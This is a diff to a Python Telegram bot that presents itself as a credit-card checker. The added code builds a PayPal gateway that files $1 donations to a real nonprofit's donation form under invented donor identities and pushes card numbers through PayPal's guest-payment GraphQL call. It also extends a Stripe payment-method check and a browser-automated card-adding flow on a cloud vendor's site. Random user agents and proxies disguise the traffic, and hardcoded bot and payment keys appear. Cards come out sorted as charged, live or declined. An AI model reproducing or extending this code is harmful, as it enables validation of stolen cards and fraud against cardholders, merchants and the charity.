@@ -3,7 +3,7 @@
 
 """
 Obeida Online - Free Multi Gateway CC Checker Bot
-Version: 23.0 - Real Check Gateway with API Monitoring
+Version: 24.0 - Complete Multi Gateway (Stripe + Real Check + PayPal)
 Author: @ObeidaOnline
 Channel: https://t.me/ObeidaTrading
 """
@@ -24,12 +24,17 @@ import re
 import os
 import threading
 import asyncio
+import base64
+import uuid
+import warnings
 from datetime import datetime, timedelta
 from typing import Dict, List, Tuple, Optional, Any
 import http.server
 import socketserver
 import shutil
-import warnings
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import argparse
+import io
 
 # استيراد المكتبات الخارجية
 try:
@@ -50,6 +55,11 @@ warnings.filterwarnings("ignore")
 
 # تهيئة الألوان
 init(autoreset=True)
+
+# Fix encoding for Windows terminal
+if sys.platform == 'win32':
+    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
+    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')
 
 # ==================== إعدادات البوت ====================
 BOT_TOKEN = "8375573526:AAFa882xWsLWl6LAfl0IcaZEU12hyP6YIy0"
@@ -77,6 +87,9 @@ DECLINED_CARDS_FILE = os.path.join(DATA_FOLDER, "declined.txt")
 STATS_FILE = os.path.join(DATA_FOLDER, "stats.json")
 SETTINGS_FILE = os.path.join(DATA_FOLDER, "settings.json")
 GROUPS_FILE = os.path.join(DATA_FOLDER, "groups.json")
+SUCCESS_FILE = os.path.join(DATA_FOLDER, "sucess.txt")
+SUFFICIENT_FUNDS_FILE = os.path.join(DATA_FOLDER, "sufficient_funds.txt")
+ERROR_FILE = os.path.join(DATA_FOLDER, "erro.txt")
 
 # ==================== إعدادات البوابات ====================
 GATES = {
@@ -93,6 +106,13 @@ GATES = {
         "mass_command": "chkm",
         "icon": "✅",
         "default": False
+    },
+    "paypal": {
+        "name": "💰 PayPal Gateway",
+        "command": "pp",
+        "mass_command": "ppm",
+        "icon": "💰",
+        "default": False
     }
 }
 
@@ -105,6 +125,7 @@ ua = UserAgent()
 user_last_file = {}
 user_active_checks = {}
 active_checks_lock = threading.Lock()
+file_lock = threading.Lock()
 
 # ==================== إدارة البيانات ====================
 class DataManager:
@@ -152,10 +173,10 @@ class DataManager:
                 "group_settings": {}
             })
         
-        for file in [APPROVED_CARDS_FILE, DECLINED_CARDS_FILE]:
+        for file in [APPROVED_CARDS_FILE, DECLINED_CARDS_FILE, SUCCESS_FILE, SUFFICIENT_FUNDS_FILE, ERROR_FILE]:
             if not os.path.exists(file):
                 with open(file, 'w', encoding='utf-8') as f:
-                    f.write(f"# {'Approved' if 'approved' in file else 'Declined'} Cards\n")
+                    f.write(f"# {'Approved' if 'approved' in file else 'Declined' if 'declined' in file else 'Success'} Cards\n")
     
     @staticmethod
     def load_json(file_path: str, default: Any = None) -> Any:
@@ -230,6 +251,14 @@ class DataManager:
             pass
     
     @staticmethod
+    def save_paypal_result(cc_str: str, status: str, msg: str):
+        fmap = {"CHARGED": SUCCESS_FILE, "APPROVED": SUCCESS_FILE, "LIVE": SUFFICIENT_FUNDS_FILE, "DECLINED": DECLINED_CARDS_FILE}
+        fn = fmap.get(status, ERROR_FILE)
+        with file_lock:
+            with open(fn, "a", encoding="utf-8") as f:
+                f.write(f"{cc_str} -> {status}: {msg}\n")
+    
+    @staticmethod
     def check_access(user_id: int, chat_id: int = None) -> bool:
         if user_id in ADMIN_IDS:
             return True
@@ -262,7 +291,7 @@ class DataManager:
         if uid not in users:
             users[uid] = {"user_id": user_id, "joined_date": datetime.now().isoformat(), "usage": {"total_checks": 0, "approved": 0, "declined": 0}}
         
-        is_approved = "✅" in result or "مقبولة" in result
+        is_approved = "✅" in result or "مقبولة" in result or "APPROVED" in result or "CHARGED" in result
         usage = users[uid]["usage"]
         usage["total_checks"] += 1
         
@@ -300,11 +329,12 @@ class Helpers:
                     year = re.sub(r'\D', '', parts[2])
                     cvv = re.sub(r'\D', '', parts[3])
                     
+                    if len(year) == 4:
+                        year = year[-2:]
+                    
                     if len(number) >= 15 and len(number) <= 19:
                         if len(month) == 1:
                             month = f"0{month}"
-                        if len(year) == 4:
-                            year = year[-2:]
                         if len(cvv) >= 3 and len(cvv) <= 4:
                             return {
                                 'number': number, 'month': month, 'year': year, 'cvv': cvv,
@@ -362,6 +392,29 @@ class Helpers:
     @staticmethod
     def get_chat_type(chat_id: int) -> str:
         return "private" if chat_id > 0 else "group"
+    
+    @staticmethod
+    def generate_random_email() -> str:
+        username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
+        number = random.randint(100, 9999)
+        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
+        return f"{username}{number}@{random.choice(domains)}"
+    
+    @staticmethod
+    def normalize_url(url: str) -> str:
+        url = url.strip()
+        if not url.startswith(('http://', 'https://')):
+            url = 'https://' + url
+        url = url.rstrip('/')
+        if '/my-account' not in url.lower():
+            url += '/my-account'
+        if not url.endswith('/'):
+            url += '/'
+        return url
+    
+    @staticmethod
+    def generate_guid() -> str:
+        return str(uuid.uuid4())
 
 # ==================== تنسيق النتائج ====================
 class ResultFormatter:
@@ -384,44 +437,69 @@ class ResultFormatter:
 🆔 Obeida Online | @ObeidaTrading
 """
 
-# ==================== بوابة Stripe ====================
+# ==================== بوابة Stripe (SetupIntent Auth) ====================
 class StripeGateway:
     async def process_card(self, card_data: Dict) -> Tuple[bool, str]:
         try:
-            timeout = aiohttp.ClientTimeout(total=60)
+            timeout = aiohttp.ClientTimeout(total=70)
             connector = aiohttp.TCPConnector(ssl=False)
             async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
-                random_ua = ua.random
+                ua_obj = UserAgent()
+                random_ua = ua_obj.random
                 stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
+                domain = "https://cloud.vast.ai"
+                
                 stripe_headers = {
                     'accept': 'application/json',
                     'content-type': 'application/x-www-form-urlencoded',
                     'origin': 'https://js.stripe.com',
+                    'referer': 'https://js.stripe.com/',
                     'user-agent': random_ua
                 }
+                
                 stripe_data = {
                     'type': 'card',
                     'card[number]': card_data['number'],
                     'card[cvc]': card_data['cvv'],
                     'card[exp_month]': card_data['month'],
                     'card[exp_year]': card_data['year'],
+                    'allow_redisplay': 'unspecified',
                     'billing_details[address][country]': 'US',
-                    'key': stripe_key
+                    'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
+                    'referrer': domain,
+                    'client_attribution_metadata[client_session_id]': Helpers.generate_guid(),
+                    'client_attribution_metadata[merchant_integration_source]': 'elements',
+                    'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
+                    'client_attribution_metadata[merchant_integration_version]': '2021',
+                    'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
+                    'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
+                    'client_attribution_metadata[elements_session_config_id]': Helpers.generate_guid(),
+                    'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
+                    'guid': Helpers.generate_guid(),
+                    'muid': Helpers.generate_guid(),
+                    'sid': Helpers.generate_guid(),
+                    'key': stripe_key,
+                    '_stripe_version': '2024-06-20'
                 }
+                
                 pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
                 pm_json = await pm_resp.json()
                 
                 if 'error' in pm_json:
                     err = pm_json['error']
                     code = err.get('decline_code', '')
+                    message = err.get('message', '')
                     if code in ['incorrect_cvc', 'invalid_cvc']:
-                        return True, "💳 CVV ERROR"
+                        return True, "💳 CVV ERROR - Card is LIVE"
                     elif code == 'insufficient_funds':
-                        return True, "💰 INSUFFICIENT FUNDS"
-                    return False, f"❌ DECLINED"
+                        return True, "💰 INSUFFICIENT FUNDS - Card is LIVE"
+                    elif 'expired' in message.lower():
+                        return False, "❌ EXPIRED CARD"
+                    return False, f"❌ DECLINED: {message[:50]}"
+                
                 return True, "✅ APPROVED"
         except Exception as e:
-            return False, f"⚠️ خطأ"
+            return False, f"⚠️ خطأ: {str(e)[:50]}"
 
 # ==================== بوابة Real Check ====================
 class RealCheckGateway:
@@ -461,8 +539,7 @@ class RealCheckGateway:
         random_ua = random.choice(self.user_agents)
         random_viewport = random.choice(self.viewports)
         
-        # متغير لتخزين نتيجة الفحص
-        card_result = {"approved": None, "message": None}
+        card_result = {"approved": None, "message": None, "card_id": None}
         response_received = threading.Event()
         
         try:
@@ -484,44 +561,59 @@ class RealCheckGateway:
                 password = "Obeida059@"
                 name = card_data.get('name', 'Card Holder')
                 
-                # ========== مراقبة API فقط ==========
                 async def handle_response(response):
                     try:
                         url = response.url()
                         
-                        # التركيز على API إضافة البطاقة
                         if 'api/v0/billing/cards/' in url and response.status == 200:
                             try:
                                 data = await response.json()
-                                
-                                # 🛡️ تطبيق قاعدة الأمان والسيولة:
-                                # يجب أن يكون الرد قائمة تحتوي على ID ويكون is_primary صحيحاً
-                                if isinstance(data, list) and len(data) > 0:
-                                    if "id" in data[0] and data[0].get("is_primary") == True:
+                                if data and isinstance(data, dict):
+                                    if data.get('id') or data.get('brand') or data.get('last4'):
                                         card_result["approved"] = True
-                                        card_result["message"] = "✅ البطاقة مقبولة وتمت إضافتها للحساب بنجاح"
+                                        card_result["message"] = "✅ البطاقة مقبولة"
+                                        card_result["card_id"] = data.get('id')
                                         response_received.set()
                                         return
-                                    else:
+                                elif isinstance(data, list):
+                                    if len(data) == 0:
                                         card_result["approved"] = False
-                                        card_result["message"] = "❌ البطاقة مرفوضة (لم تصبح أساسية)"
+                                        card_result["message"] = "❌ البطاقة مرفوضة"
                                         response_received.set()
                                         return
-                                else:
-                                    card_result["approved"] = False
-                                    card_result["message"] = "❌ البطاقة مرفوضة (رد السيرفر فارغ)"
-                                    response_received.set()
-                                    return
-                                            
-                            except Exception as e:
+                                    elif len(data) > 0 and isinstance(data[0], dict):
+                                        if data[0].get('id') or data[0].get('brand'):
+                                            card_result["approved"] = True
+                                            card_result["message"] = "✅ البطاقة مقبولة"
+                                            response_received.set()
+                                            return
+                            except:
                                 pass
-                                
-                    except Exception as e:
+                        
+                        if 'api.stripe.com' in url and ('payment_intents' in url or 'payment_methods' in url):
+                            try:
+                                data = await response.json()
+                                if data.get('error'):
+                                    error = data.get('error')
+                                    error_code = error.get('code', '')
+                                    error_message = error.get('message', '').lower()
+                                    if 'cvv' in error_message or 'security' in error_message or error_code == 'incorrect_cvc':
+                                        card_result["approved"] = True
+                                        card_result["message"] = "✅ البطاقة مقبولة"
+                                        response_received.set()
+                                        return
+                                    elif 'insufficient' in error_message:
+                                        card_result["approved"] = True
+                                        card_result["message"] = "✅ البطاقة مقبولة"
+                                        response_received.set()
+                                        return
+                            except:
+                                pass
+                    except:
                         pass
                 
                 page.on('response', handle_response)
                 
-                # ========== تنفيذ خطوات الفحص ==========
                 await page.goto("https://cloud.vast.ai/create/", timeout=30000)
                 await asyncio.sleep(random.uniform(1.5, 2.5))
                 
@@ -569,42 +661,437 @@ class RealCheckGateway:
                 await self.type_like_human(page, "#billingPostalCode", "90003")
                 await asyncio.sleep(random.uniform(0.3, 0.6))
                 
-                # ========== الضغط على زر إضافة البطاقة ==========
                 await page.locator('div.SubmitButton-IconContainer').click()
                 
-                # ========== انتظار الرد من API ==========
                 try:
                     await asyncio.wait_for(response_received.wait(), timeout=25)
                 except:
                     pass
                 
+                current_url = page.url
+                page_content = await page.content()
+                
                 await browser.close()
                 
-                # ========== تحليل النتيجة ==========
                 if card_result["approved"] is True:
                     return True, card_result["message"]
-                
                 if card_result["approved"] is False:
                     return False, card_result["message"]
                 
-                # إذا لم يصل رد
-                return False, "❌ البطاقة مرفوضة (لم يتم استلام رد)"
+                combined_text = (current_url + " " + page_content).lower()
+                
+                if 'billing?session_id=' in current_url:
+                    return True, "✅ البطاقة مقبولة"
+                if 'payment-methods' in current_url and card_data['number'][-4:] in page_content:
+                    return True, "✅ البطاقة مقبولة"
+                if 'stripe.com' in current_url:
+                    if 'cvv' in combined_text or 'security' in combined_text:
+                        return True, "✅ البطاقة مقبولة"
+                    if 'insufficient' in combined_text:
+                        return True, "✅ البطاقة مقبولة"
+                    if 'declined' in combined_text:
+                        return False, "❌ البطاقة مرفوضة"
+                if 'id' in combined_text and card_data['number'][-4:] in combined_text:
+                    return True, "✅ البطاقة مقبولة"
+                
+                return False, "❌ البطاقة مرفوضة"
                         
         except Exception as e:
             print(f"⚠️ خطأ: {e}")
             return False, "❌ البطاقة مرفوضة"
+
+# ==================== بوابة PayPal ====================
+class PayPalGateway:
+    
+    FIRST_NAMES = [
+        "James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda",
+        "William","Elizabeth","David","Barbara","Richard","Susan","Joseph","Jessica",
+        "Thomas","Sarah","Christopher","Karen","Daniel","Lisa","Matthew","Nancy",
+        "Anthony","Betty","Mark","Margaret","Donald","Sandra","Steven","Ashley",
+        "Paul","Dorothy","Andrew","Kimberly","Joshua","Emily","Kenneth","Donna"
+    ]
+    
+    LAST_NAMES = [
+        "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
+        "Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson",
+        "Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson",
+        "White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker"
+    ]
+    
+    ADDRESSES = [
+        {"line1": "742 Evergreen Terrace", "city": "Springfield", "state": "IL", "zip": "62704"},
+        {"line1": "123 Maple Street", "city": "Anytown", "state": "NY", "zip": "10001"},
+        {"line1": "456 Oak Avenue", "city": "Riverside", "state": "CA", "zip": "92501"},
+        {"line1": "789 Pine Road", "city": "Lakewood", "state": "CO", "zip": "80226"},
+        {"line1": "321 Elm Boulevard", "city": "Portland", "state": "OR", "zip": "97201"},
+        {"line1": "654 Cedar Lane", "city": "Austin", "state": "TX", "zip": "73301"},
+        {"line1": "987 Birch Drive", "city": "Denver", "state": "CO", "zip": "80201"},
+        {"line1": "147 Walnut Court", "city": "Phoenix", "state": "AZ", "zip": "85001"},
+        {"line1": "258 Spruce Way", "city": "Seattle", "state": "WA", "zip": "98101"},
+        {"line1": "369 Willow Place", "city": "Miami", "state": "FL", "zip": "33101"},
+    ]
+    
+    PHONE_PREFIXES = ["212","310","312","415","602","713","206","305","404","503"]
+    EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com"]
+    
+    def __init__(self, proxy: Optional[str] = None):
+        self.session = requests.Session()
+        self.session.verify = True
+        self.last_error = ""
+        if proxy:
+            if proxy.count(':') == 3 and '@' not in proxy:
+                p = proxy.split(':')
+                fmt = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
+                self.session.proxies = {"http": fmt, "https": fmt}
+            elif '@' in proxy:
+                self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+            else:
+                self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+        
+        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+        self.ajax_headers = {
+            "User-Agent": self.ua,
+            "Accept": "*/*",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Origin": "https://awwatersheds.org",
+            "Referer": "https://awwatersheds.org/donate/",
+            "X-Requested-With": "XMLHttpRequest"
+        }
+        self.tokens = {}
+    
+    def random_donor(self) -> Dict[str, str]:
+        first = random.choice(self.FIRST_NAMES)
+        last = random.choice(self.LAST_NAMES)
+        addr = random.choice(self.ADDRESSES)
+        phone = random.choice(self.PHONE_PREFIXES) + ''.join([str(random.randint(0,9)) for _ in range(7)])
+        domain = random.choice(self.EMAIL_DOMAINS)
+        email = f"{first.lower()}{random.randint(10,9999)}@{domain}"
+        return {
+            "first": first,
+            "last": last,
+            "email": email,
+            "phone": phone,
+            "address": addr
+        }
+    
+    def detect_type(self, n: str) -> str:
+        n = n.replace(" ", "").replace("-", "")
+        if n.startswith("4"):
+            return "VISA"
+        elif re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n):
+            return "MASTER_CARD"
+        elif n.startswith(("34", "37")):
+            return "AMEX"
+        elif n.startswith(("6011", "65")) or re.match(r"^64[4-9]", n):
+            return "DISCOVER"
+        return "VISA"
+    
+    def scrape_tokens(self) -> bool:
+        try:
+            r = self.session.get("https://awwatersheds.org/donate/", headers={"User-Agent": self.ua}, timeout=20)
+            html = r.text
+            h = re.search(r'name="give-form-hash" value="(.*?)"', html)
+            if not h:
+                h = re.search(r'"base_hash":"(.*?)"', html)
+            if not h:
+                self.last_error = "Hash not found"
+                return False
+            self.tokens['hash'] = h.group(1)
+            pfx = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
+            if pfx:
+                self.tokens['pfx'] = pfx.group(1)
+            fid = re.search(r'name="give-form-id" value="(.*?)"', html)
+            if fid:
+                self.tokens['id'] = fid.group(1)
+            return True
+        except Exception as e:
+            self.last_error = str(e)
+            return False
+    
+    def register_donation(self, donor: Dict[str, str]) -> bool:
+        data = {
+            "give-honeypot": "",
+            "give-form-id-prefix": self.tokens.get('pfx', ''),
+            "give-form-id": self.tokens.get('id', ''),
+            "give-form-title": "Sustainers Circle",
+            "give-current-url": "https://awwatersheds.org/donate/",
+            "give-form-url": "https://awwatersheds.org/donate/",
+            "give-form-hash": self.tokens.get('hash', ''),
+            "give-price-id": "custom",
+            "give-amount": "1.00",
+            "payment-mode": "paypal-commerce",
+            "give_first": donor["first"],
+            "give_last": donor["last"],
+            "give_email": donor["email"],
+            "give-lake-affiliation": "Other",
+            "give_action": "purchase",
+            "give-gateway": "paypal-commerce",
+            "action": "give_process_donation",
+            "give_ajax": "true"
+        }
+        try:
+            r = self.session.post("https://awwatersheds.org/wp-admin/admin-ajax.php", headers=self.ajax_headers, data=data, timeout=20)
+            return r.status_code == 200
+        except:
+            return False
+    
+    def create_order(self) -> Optional[str]:
+        data = {
+            "give-honeypot": "",
+            "give-form-id-prefix": self.tokens.get('pfx', ''),
+            "give-form-id": self.tokens.get('id', ''),
+            "give-form-hash": self.tokens.get('hash', ''),
+            "payment-mode": "paypal-commerce",
+            "give-amount": "1.00",
+            "give-gateway": "paypal-commerce",
+        }
+        try:
+            r = self.session.post("https://awwatersheds.org/wp-admin/admin-ajax.php",
+                                  params={"action": "give_paypal_commerce_create_order"},
+                                  headers=self.ajax_headers, data=data, timeout=20)
+            rj = r.json()
+            if rj.get("success") and "data" in rj:
+                return rj["data"]["id"]
+            return None
+        except:
+            return None
+    
+    def charge_card(self, order_id: str, card: Dict[str, str], donor: Dict[str, str]) -> str:
+        addr = donor["address"]
+        graphql_h = {
+            "Host": "www.paypal.com",
+            "Paypal-Client-Context": order_id,
+            "X-App-Name": "standardcardfields",
+            "Paypal-Client-Metadata-Id": order_id,
+            "User-Agent": self.ua,
+            "Content-Type": "application/json",
+            "Origin": "https://www.paypal.com",
+            "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
+            "X-Country": "US"
+        }
+        
+        query = """
+        mutation payWithCard(
+            $token: String!
+            $card: CardInput
+            $paymentToken: String
+            $phoneNumber: String
+            $firstName: String
+            $lastName: String
+            $shippingAddress: AddressInput
+            $billingAddress: AddressInput
+            $email: String
+            $currencyConversionType: CheckoutCurrencyConversionType
+            $installmentTerm: Int
+            $identityDocument: IdentityDocumentInput
+            $feeReferenceId: String
+        ) {
+            approveGuestPaymentWithCreditCard(
+                token: $token
+                card: $card
+                paymentToken: $paymentToken
+                phoneNumber: $phoneNumber
+                firstName: $firstName
+                lastName: $lastName
+                email: $email
+                shippingAddress: $shippingAddress
+                billingAddress: $billingAddress
+                currencyConversionType: $currencyConversionType
+                installmentTerm: $installmentTerm
+                identityDocument: $identityDocument
+                feeReferenceId: $feeReferenceId
+            ) {
+                flags { is3DSecureRequired }
+                cart {
+                    intent
+                    cartId
+                    buyer { userId auth { accessToken } }
+                    returnUrl { href }
+                }
+                paymentContingencies {
+                    threeDomainSecure {
+                        status method
+                        redirectUrl { href }
+                        parameter
+                    }
+                }
+            }
+        }
+        """
+        
+        full_yy = card['yy'] if len(card['yy']) == 4 else "20" + card['yy']
+        billing = {
+            "givenName": donor["first"], "familyName": donor["last"],
+            "line1": addr["line1"], "line2": None,
+            "city": addr["city"], "state": addr["state"],
+            "postalCode": addr["zip"], "country": "US"
+        }
+        
+        variables = {
+            "token": order_id,
+            "card": {
+                "cardNumber": card["number"],
+                "type": self.detect_type(card["number"]),
+                "expirationDate": f"{card['mm']}/{full_yy}",
+                "postalCode": addr["zip"],
+                "securityCode": card["cvc"]
+            },
+            "phoneNumber": donor["phone"],
+            "firstName": donor["first"],
+            "lastName": donor["last"],
+            "email": donor["email"],
+            "billingAddress": billing,
+            "shippingAddress": billing,
+            "currencyConversionType": "PAYPAL"
+        }
+        
+        try:
+            r = requests.post(
+                "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
+                headers=graphql_h,
+                json={"query": query, "variables": variables},
+                timeout=30
+            )
+            return r.text
+        except Exception as e:
+            return f"ERROR: {e}"
+    
+    def approve_order(self, order_id: str) -> str:
+        data = {
+            "give-honeypot": "",
+            "give-form-id-prefix": self.tokens.get('pfx', ''),
+            "give-form-id": self.tokens.get('id', ''),
+            "give-form-hash": self.tokens.get('hash', ''),
+            "payment-mode": "paypal-commerce",
+            "give-amount": "1.00",
+            "give-gateway": "paypal-commerce",
+        }
+        try:
+            r = self.session.post(
+                "https://awwatersheds.org/wp-admin/admin-ajax.php",
+                params={"action": "give_paypal_commerce_approve_order", "order": order_id},
+                headers=self.ajax_headers, data=data, timeout=30
+            )
+            return r.text
+        except Exception as e:
+            return f"ERROR: {e}"
+    
+    def analyze_response(self, paypal_text: str, approve_text: str = "") -> Dict[str, str]:
+        t = paypal_text.upper() if paypal_text else ""
+        
+        if 'APPROVESTATE":"APPROVED' in t:
+            return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED - Payment Approved!"}
+        if 'PARENTTYPE":"AUTH' in t and '"CARTID"' in t:
+            return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED - Auth Successful!"}
+        if '"APPROVEGUESTPAYMENTWITHCREDITCARD"' in t and '"ERRORS"' not in t and '"CARTID"' in t:
+            return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED!"}
+        if 'CVV2_FAILURE' in t:
+            return {"status": "APPROVED", "emoji": "✅", "msg": "CVV2 FAILURE (Card is LIVE)"}
+        if 'INVALID_SECURITY_CODE' in t:
+            return {"status": "APPROVED", "emoji": "✅", "msg": "Invalid Security Code (LIVE)"}
+        if 'INVALID_BILLING_ADDRESS' in t:
+            return {"status": "APPROVED", "emoji": "✅", "msg": "AVS FAILED (LIVE)"}
+        if 'EXISTING_ACCOUNT_RESTRICTED' in t:
+            return {"status": "APPROVED", "emoji": "✅", "msg": "Account Restricted (LIVE)"}
+        if 'INSUFFICIENT_FUNDS' in t:
+            return {"status": "LIVE", "emoji": "💰", "msg": "Insufficient Funds (LIVE CARD)"}
+        
+        combined = t + " " + (approve_text.upper() if approve_text else "")
+        declines = [
+            ('DO_NOT_HONOR', 'Do Not Honor'),
+            ('ACCOUNT_CLOSED', 'Account Closed'),
+            ('PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'Account Locked/Closed'),
+            ('LOST_OR_STOLEN', 'LOST OR STOLEN'),
+            ('SUSPECTED_FRAUD', 'SUSPECTED FRAUD'),
+            ('INVALID_ACCOUNT', 'INVALID ACCOUNT'),
+            ('REATTEMPT_NOT_PERMITTED', 'REATTEMPT NOT PERMITTED'),
+            ('ACCOUNT_BLOCKED_BY_ISSUER', 'ACCOUNT BLOCKED BY ISSUER'),
+            ('ORDER_NOT_APPROVED', 'ORDER NOT APPROVED'),
+            ('PICKUP_CARD_SPECIAL_CONDITIONS', 'PICKUP CARD'),
+            ('PAYER_CANNOT_PAY', 'PAYER CANNOT PAY'),
+            ('GENERIC_DECLINE', 'GENERIC DECLINE'),
+            ('COMPLIANCE_VIOLATION', 'COMPLIANCE VIOLATION'),
+            ('TRANSACTION_NOT_PERMITTED', 'TRANSACTION NOT PERMITTED'),
+            ('PAYMENT_DENIED', 'PAYMENT DENIED'),
+            ('INVALID_TRANSACTION', 'INVALID TRANSACTION'),
+            ('RESTRICTED_OR_INACTIVE_ACCOUNT', 'RESTRICTED/INACTIVE ACCOUNT'),
+            ('SECURITY_VIOLATION', 'SECURITY VIOLATION'),
+            ('DECLINED_DUE_TO_UPDATED_ACCOUNT', 'DECLINED - UPDATED ACCOUNT'),
+            ('INVALID_OR_RESTRICTED_CARD', 'INVALID/RESTRICTED CARD'),
+            ('EXPIRED_CARD', 'EXPIRED CARD'),
+            ('CRYPTOGRAPHIC_FAILURE', 'CRYPTOGRAPHIC FAILURE'),
+            ('TRANSACTION_CANNOT_BE_COMPLETED', 'CANNOT BE COMPLETED'),
+            ('DECLINED_PLEASE_RETRY', 'DECLINED - RETRY LATER'),
+            ('TX_ATTEMPTS_EXCEED_LIMIT', 'TX ATTEMPTS EXCEED LIMIT'),
+        ]
+        for keyword, msg in declines:
+            if keyword in combined:
+                return {"status": "DECLINED", "emoji": "❌", "msg": msg}
+        
+        try:
+            rj = json.loads(paypal_text)
+            if "errors" in rj:
+                return {"status": "DECLINED", "emoji": "❌", "msg": rj["errors"][0].get("message", "Unknown")}
+        except:
+            pass
+        try:
+            rj = json.loads(approve_text)
+            if rj.get("data", {}).get("error"):
+                return {"status": "DECLINED", "emoji": "❌", "msg": str(rj["data"]["error"])}
+        except:
+            pass
+        
+        return {"status": "DECLINED", "emoji": "❌", "msg": "UNKNOWN ERROR"}
+    
+    def check_card(self, card_data: Dict) -> Tuple[bool, str]:
+        try:
+            cc_str = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
+            card_info = {
+                "number": card_data['number'],
+                "mm": card_data['month'].zfill(2),
+                "yy": card_data['year'],
+                "cvc": card_data['cvv']
+            }
+            if len(card_info['yy']) == 2:
+                card_info['yy'] = "20" + card_info['yy']
+            
+            donor = self.random_donor()
+            
+            if not self.scrape_tokens():
+                return False, f"Token scrape failed: {self.last_error}"
+            
+            if not self.register_donation(donor):
+                return False, "Donation registration failed"
+            
+            order_id = self.create_order()
+            if not order_id:
+                return False, "PayPal order creation failed"
+            
+            graphql_resp = self.charge_card(order_id, card_info, donor)
+            approve_resp = self.approve_order(order_id)
+            
+            result = self.analyze_response(graphql_resp, approve_resp)
+            
+            is_approved = result["status"] in ["CHARGED", "APPROVED", "LIVE"]
+            return is_approved, f"{result['emoji']} {result['status']}: {result['msg']}"
+            
+        except Exception as e:
+            return False, f"Error: {str(e)[:50]}"
 
 # ==================== بوابات الفحص ====================
 class RealGateways:
     def __init__(self):
         self.stripe = StripeGateway()
         self.real = RealCheckGateway()
+        self.paypal = PayPalGateway()
     
     async def check_card(self, gate: str, card: Dict) -> Tuple[bool, str]:
         if gate == 'stripe':
             return await self.stripe.process_card(card)
         elif gate == 'real':
             return await self.real.check_card(card)
+        elif gate == 'paypal':
+            return await asyncio.get_event_loop().run_in_executor(None, self.paypal.check_card, card)
         return False, "❌ بوابة غير مدعومة"
 
 # ==================== واجهة المستخدم ====================
@@ -673,16 +1160,19 @@ class CommandHandler:
 <b>📝 البوابات المتاحة:</b>
 💳 Stripe - فحص سريع
 ✅ Real Check - فحص حقيقي
+💰 PayPal - فحص PayPal
 
 <b>📝 الأوامر:</b>
 /st [البطاقة] - فحص عبر Stripe
 /chk [البطاقة] - فحص عبر Real Check
+/pp [البطاقة] - فحص عبر PayPal
 /mass [ملف] - فحص ملف عبر Stripe
 /chkm [ملف] - فحص ملف عبر Real Check
+/ppm [ملف] - فحص ملف عبر PayPal
 /stop - إيقاف الفحص
 /profile - عرض إحصائياتك
 /stats - إحصائيات البوت
-/default [stripe/real] - تغيير البوابة
+/default [stripe/real/paypal] - تغيير البوابة
 /lastfile - فحص آخر ملف
 
 <b>📢 القناة:</b> {CHANNEL_USERNAME}
@@ -742,12 +1232,12 @@ class CommandHandler:
         parts = message.text.strip().split()
         if len(parts) < 2:
             current = DataManager.get_user_default_gate(message.from_user.id)
-            bot.reply_to(message, f"⚙️ البوابة الحالية: {GATES[current]['name']}\nللتغيير: <code>/default stripe</code> أو <code>/default real</code>", parse_mode='HTML')
+            bot.reply_to(message, f"⚙️ البوابة الحالية: {GATES[current]['name']}\nللتغيير: <code>/default stripe</code> أو <code>/default real</code> أو <code>/default paypal</code>", parse_mode='HTML')
             return
         
         gate = parts[1].lower()
         if gate not in GATES:
-            bot.reply_to(message, "❌ بوابة غير موجودة", parse_mode='HTML')
+            bot.reply_to(message, "❌ بوابة غير موجودة\nالبوابات المتاحة: stripe, real, paypal", parse_mode='HTML')
             return
         
         if DataManager.set_user_default_gate(message.from_user.id, gate):
@@ -797,6 +1287,12 @@ class CommandHandler:
             
             DataManager.update_usage(user_id, gate, resp)
             DataManager.save_card_result(card['original'], gate_name, resp, user_id, approved)
+            
+            if gate == 'paypal':
+                cc_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
+                status = "CHARGED" if approved else "DECLINED"
+                DataManager.save_paypal_result(cc_str, status, resp)
+            
             bin_info = Helpers.get_bin_info(card['number'][:6])
             final_result = ResultFormatter.format_single_result(card['original'], resp, approved, gate_name, bin_info)
             bot.edit_message_text(final_result, chat_id, message_id, parse_mode='HTML')
@@ -874,6 +1370,12 @@ class CommandHandler:
                     
                     DataManager.save_card_result(card['original'], gate_name, resp, user_id, approved)
                     DataManager.update_usage(user_id, gate, resp)
+                    
+                    if gate == 'paypal':
